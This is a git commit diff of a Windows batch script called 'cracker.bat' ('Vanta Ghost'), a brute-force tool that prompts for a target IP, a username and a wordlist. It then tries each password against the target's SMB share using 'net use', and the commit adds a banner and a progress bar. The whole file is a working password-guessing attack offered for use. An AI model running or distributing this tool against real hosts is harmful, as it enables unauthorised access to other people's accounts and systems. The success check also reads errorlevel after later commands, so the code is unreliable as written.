e6ecddaf512580379cac32b6c048238fc3e97aa9
Akshay Suresh <akshaysuresh1117@gmail.com>
2025-06-10 12:59:27 +0530

    Update cracker.bat

--- Simple_BruteForce/cracker.bat
+++ Simple_BruteForce/cracker.bat
@@ -1,14 +1,32 @@
 @echo off
-title  Simple Bruteforce - Vanta Ghost
+title Simple Bruteforce - Vanta Ghost
 color A
-echo.
-set /p ip="Enter IP Address:"
-set /p user="Enter UserName:"
-set /p wordlist="Enter Pasword List:"
+setlocal enabledelayedexpansion
 
-set /a count=0
+echo.
+echo  ___      ___ ________  ________   _________  ________          ________  ___  ___  ________  ________  _________   
+echo |\  \    /  /|\   __  \|\   ___  \|\___   ___\\   __  \        |\   ____\|\  \|\  \|\   __  \|\   ____\|\___   ___\ 
+echo \ \  \  /  / | \  \|\  \ \  \\ \  \|___ \  \_\ \  \|\  \       \ \  \___|\ \  \\\  \ \  \|\  \ \  \___|\|___ \  \_| 
+echo  \ \  \/  / / \ \   __  \ \  \\ \  \   \ \  \ \ \   __  \       \ \  \  __\ \   __  \ \  \\\  \ \_____  \   \ \  \  
+echo   \ \    / /   \ \  \ \  \ \  \\ \  \   \ \  \ \ \  \ \  \       \ \  \|\  \ \  \ \  \ \  \\\  \|____|\  \   \ \  \ 
+echo    \ \__/ /     \ \__\ \__\ \__\\ \__\   \ \__\ \ \__\ \__\       \ \_______\ \__\ \__\ \_______\____\_\  \   \ \__\
+echo     \|__|/       \|__|\|__|\|__| \|__|    \|__|  \|__|\|__|        \|_______|\|__|\|__|\|_______|\_________\   \|__|
+echo                                                                                                \|_________|        
+echo.
+
+set /p ip="Enter IP Address: "
+set /p user="Enter UserName: "
+set /p wordlist="Enter Password List File: "
+
+:: Count total passwords
+set /a total=0
 for /f %%a in (%wordlist%) do (
-    echo %%a
+    set /a total+=1
+)
+
+set /a count=1
+
+for /f %%a in (%wordlist%) do (
     set pass=%%a
     call :attempt
 )
@@ -18,14 +36,29 @@ pause
 exit
 
 :success
-echo Password Found!: %pass% >nul 2>&1
-net use  \\%ip% /d /y
+echo.
+echo ============================================
+echo           Password Found: !pass!
+echo ============================================
+net use \\%ip% /d /y
 pause
 exit
 
 :attempt
-net use \\%ip% /user:%user% %pass% >nul 2>&1
-echo [Attempt %count%] [%pass%]
-set /a count=%count%+1
-echo attempt: %pass%
-if %errorlevel% EQU 0  goto success
+:: Try to connect
+net use \\%ip% /user:%user% !pass! >nul 2>&1
+
+:: Display Progress Bar
+set /a progress=(count * 50) / total
+set "bar="
+for /l %%i in (1,1,!progress!) do set "bar=!bar!#"
+for /l %%i in (!progress!,1,50) do set "bar=!bar!-"
+cls
+echo Trying Password: !pass!
+echo [!bar!] !count! of !total! attempts
+echo.
+
+set /a count+=1
+
+if !errorlevel! EQU 0 goto success
+exit /b
